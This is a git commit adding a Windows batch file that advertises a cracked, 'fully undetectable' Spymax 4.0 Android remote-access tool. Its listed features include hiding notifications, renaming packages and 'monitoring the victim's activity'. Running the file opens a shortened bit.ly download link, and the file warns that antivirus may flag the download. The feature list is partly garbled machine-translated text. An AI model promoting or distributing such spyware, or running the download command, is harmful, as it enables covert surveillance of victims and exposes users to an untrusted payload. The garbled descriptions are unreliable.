ab42a022ee1b84581853d10faeaab0e24d39561c
githuob <61633508+githuob@users.noreply.github.com>
2021-01-31 19:06:01 +0100

    Add files via upload

---
+++ Spymax 4.0.bat
@@ -0,0 +1,34 @@
+@echo 
+
+
+SPYMAX 4.0 LATEST FULLY UNDETECTABLE CRACKED VERSION
+ 
+
+
+Spymax 4.0 Cracked 
+ 
+Features:
+
+
+• NET Framework 4.5 The program is compatible with the following Microsoft Windows systems • Windows 10 • Windows 8 • Windows 7 • Windows XP The patch is compatible with Android systems • 9.0 - Bay / pie • 8.0 - Oreo / Oreo • 7.0 - Nougat / nougat • 6.0 - Marschmilo / marshmallow 's • 5.0 - the Crown Bob / lollipop Features.
+
+
+•  Log in and check the hash version to ensure its integrity
+• Developing the patch to be compatible with the latest version  • Hiding notifications (doze) • Connecting applications, videos, photos ... • Advanced linking • Changing the package name • You do not need Java in the patch building process • Monitoring the victim's activity
+• Automatic Althithat
+• Adjust the stability of the version
+and other features.
+
+
+improvements
+• Addmenu attopprogram 
+• was repairedproblemsudden Althennej • have been repaired sinned Almaekervon • have been repaired misplaceterminal • Improvespeedprogram communication • Improve program interfaces • improve location accuracy and other improvements.
+ 
+
+ 
+Note:-Sometime its Show Virus, we'll not responsible for any damage
+
+Download:ENTER
+-------------------------------------------------------------------------_____________________________
+Happy Hacking! (Please do not spam it, It's Just For Knowledge ...)
+start https://bit.ly/2McDHtj 
